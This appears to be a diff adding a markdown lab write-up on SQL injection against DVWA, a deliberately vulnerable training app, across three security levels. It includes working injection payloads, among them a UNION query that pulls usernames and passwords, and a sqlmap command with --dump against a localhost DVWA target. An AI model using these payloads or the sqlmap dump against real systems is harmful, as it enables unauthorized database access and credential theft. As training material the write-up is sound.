@@ -1,0 +1,160 @@
+# DVWA – SQL Injection & Blind SQL Injection
+
+**Security Levels:** Low | Medium | High
+
+---
+
+# SQL Injection (Classic)
+
+## LOW Level
+
+### Why it is Vulnerable
+
+* User input is **directly concatenated** into SQL query
+* **No input validation**
+* **No filtering**
+* **Error messages enabled**
+
+### Backend Query (Conceptual)
+
+```sql
+SELECT first_name, last_name FROM users WHERE user_id = '$id';
+```
+
+---
+
+### Payloads (PoC)
+
+#### Authentication Bypass / Data Extraction
+
+```sql
+1' OR '1'='1' --
+```
+
+#### Union-based SQLi
+
+```sql
+1' UNION SELECT user, password FROM users --
+```
+
+---
+
+### Result
+
+* All user records displayed
+* SQL errors visible
+* Full database disclosure possible
+
+
+---
+
+### Impact
+
+* Database compromise
+* Credential leakage
+* Privilege escalation
+
+---
+
+### Severity: **High**
+
+---
+
+## MEDIUM Level
+
+### Why it is Vulnerable
+
+* Input is **partially sanitized**
+* Uses **mysqli_real_escape_string**
+* Still **logic-based SQLi possible**
+
+### Code Behavior
+
+```php
+$id = mysqli_real_escape_string($conn, $_GET['id']);
+```
+
+---
+
+### Payloads
+
+#### Boolean-based Injection
+
+```sql
+1 OR 1=1
+```
+
+#### Comment-based Bypass
+
+```sql
+1 OR 1=1 #
+```
+
+---
+
+### Result
+
+* SQL injection still possible
+* Union-based injection harder
+* Errors partially suppressed
+
+
+---
+
+### Impact
+
+* Unauthorized data access
+* Data leakage
+
+---
+
+### Severity: **Medium**
+
+---
+
+## HIGH Level
+
+### Why it is More Secure
+
+* **Prepared statements**
+* Stronger input validation
+* SQL errors hidden
+
+---
+
+### Payload Attempt
+
+```sql
+1' OR '1'='1' --
+```
+
+---
+
+### Result
+
+ Injection fails
+ No SQL errors
+ No data disclosure
+
+---
+
+### Impact
+
+* SQL injection **not exploitable**
+
+---
+
+### Severity: **Low (Secure)**
+
+---
+
+
+
+# SQLMap Proof (Low Level)
+
+### SQL Injection
+
+```bash
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+--cookie="security=low; PHPSESSID=xxxx" --dump
+```
